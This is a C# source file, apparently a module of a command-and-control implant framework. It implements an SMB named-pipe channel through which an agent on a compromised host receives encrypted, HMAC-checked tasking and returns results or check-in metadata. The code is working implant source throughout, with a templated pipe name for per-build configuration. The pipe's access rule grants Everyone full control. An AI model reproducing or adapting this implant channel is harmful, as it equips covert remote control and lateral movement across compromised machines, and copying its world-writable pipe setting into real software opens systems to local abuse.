using Agent.Controllers;
using Agent.Interfaces;
using Agent.Models;

using Common;
using Common.Models;

using System;
using System.Collections.Generic;
using System.IO.Pipes;
using System.Security.Principal;
using System.Threading;
using System.Threading.Tasks;

namespace Agent.Modules
{
    class StateObject
    {
        public NamedPipeServerStream workStream = null;
        public const int BufferSize = 65535;
        public byte[] buffer = new byte[BufferSize];
        public byte[] tmpBuffer = null;
    }

    public class SmbCommModule : ICommModule
    {
        private string PipeName { get; set; } = "<<PipeName>>";
        private ConfigController Config { get; set; }
        private CryptoController Crypto { get; set; }
        private ModuleStatus ModuleStatus { get; set; }
        private Queue<AgentMessage> InboundC2Data { get; set; } = new Queue<AgentMessage>();
        private Queue<AgentMessage> OutboundC2Data { get; set; } = new Queue<AgentMessage>();

        private static ManualResetEvent AllDone = new ManualResetEvent(false);

        public ModuleStatus GetStatus()
        {
            return ModuleStatus;
        }

        public void Init(ConfigController config, CryptoController crypto)
        {
            Config = config;
            Crypto = crypto;
        }

        public bool RecvData(out AgentMessage message)
        {
            if (InboundC2Data.Count > 0)
            {
                message = InboundC2Data.Dequeue();
                return true;
            }

            message = null;
            return false;
        }

        public void SendData(AgentMessage message)
        {
            OutboundC2Data.Enqueue(message);
        }

        public void Start()
        {
            var ps = new PipeSecurity();
            var everyone = new SecurityIdentifier(WellKnownSidType.WorldSid, null);
            ps.AddAccessRule(new PipeAccessRule(everyone, PipeAccessRights.FullControl, System.Security.AccessControl.AccessControlType.Allow));

            ModuleStatus = ModuleStatus.Running;

            Task.Factory.StartNew(delegate ()
            {
                while (ModuleStatus == ModuleStatus.Running)
                {
                    AllDone.Reset();
                    var pipe = new NamedPipeServerStream(PipeName, PipeDirection.InOut, NamedPipeServerStream.MaxAllowedServerInstances, PipeTransmissionMode.Message, PipeOptions.Asynchronous, 65535, 65535, ps);
                    pipe.BeginWaitForConnection(new AsyncCallback(ConnectCallback), pipe);
                    AllDone.WaitOne();
                }
            });
        }

        private void ConnectCallback(IAsyncResult ar)
        {
            AllDone.Set();

            var pipe = ar.AsyncState as NamedPipeServerStream;
            pipe.EndWaitForConnection(ar);

            if (ModuleStatus == ModuleStatus.Running)
            {
                var state = new StateObject { workStream = pipe };
                pipe.BeginRead(state.buffer, 0, state.buffer.Length, new AsyncCallback(ReadCallback), state);
            }
        }

        private void ReadCallback(IAsyncResult ar)
        {
            var state = ar.AsyncState as StateObject;
            var bytesRead = 0;

            try
            {
                bytesRead = state.workStream.EndRead(ar);
            }
            catch { }

            if (bytesRead > 0)
            {
                var dataReceived = state.buffer.TrimBytes();

                if (bytesRead == state.buffer.Length)
                {
                    if (state.tmpBuffer != null)
                    {
                        var tmp = state.tmpBuffer;
                        state.tmpBuffer = new byte[tmp.Length + dataReceived.Length];
                        Buffer.BlockCopy(tmp, 0, state.tmpBuffer, 0, tmp.Length);
                        Buffer.BlockCopy(dataReceived, 0, state.tmpBuffer, tmp.Length, dataReceived.Length);
                    }
                    else
                    {
                        state.tmpBuffer = new byte[dataReceived.Length];
                        Buffer.BlockCopy(dataReceived, 0, state.tmpBuffer, 0, dataReceived.Length);
                    }

                    Array.Clear(state.buffer, 0, state.buffer.Length);
                    state.workStream.BeginRead(state.buffer, 0, state.buffer.Length, new AsyncCallback(ReadCallback), state);
                }
                else
                {
                    byte[] final;
                    if (state.tmpBuffer != null)
                    {
                        final = new byte[state.tmpBuffer.Length + dataReceived.Length];
                        Buffer.BlockCopy(state.tmpBuffer, 0, final, 0, state.tmpBuffer.Length);
                        Buffer.BlockCopy(dataReceived, 0, final, state.tmpBuffer.Length, dataReceived.Length);
                    }
                    else
                    {
                        final = new byte[dataReceived.Length];
                        Buffer.BlockCopy(dataReceived, 0, final, 0, dataReceived.Length);
                    }

                    var finalData = final.TrimBytes();

                    if (Crypto.VerifyHMAC(finalData))
                    {
                        var inbound = Crypto.Decrypt<List<AgentMessage>>(finalData);

                        if (inbound.Count > 0)
                        {
                            foreach (var dataIn in inbound)
                            {
                                InboundC2Data.Enqueue(dataIn);
                            }
                        }
                    }

                    var outbound = new List<AgentMessage>();

                    if (OutboundC2Data.Count > 0)
                    {
                        while (OutboundC2Data.Count != 0)
                        {
                            outbound.Add(OutboundC2Data.Dequeue());
                        }
                    }
                    else
                    {
                        outbound.Add(new AgentMessage
                        {
                            IdempotencyKey = Guid.NewGuid().ToString(),
                            Metadata = Config.GetOption(ConfigSetting.Metadata) as AgentMetadata,
                            Data = new C2Data()
                        });
                    }

                    var dataToSend = Crypto.Encrypt(outbound);
                    state.workStream.BeginWrite(dataToSend, 0, dataToSend.Length, new AsyncCallback(WriteCallback), state);
                }
            }
        }

        private void WriteCallback(IAsyncResult ar)
        {
            var state = ar.AsyncState as StateObject;
            state.workStream.EndWrite(ar);
            state.workStream.Close();
        }

        public void Stop()
        {
            ModuleStatus = ModuleStatus.Stopped;
        }
    }
}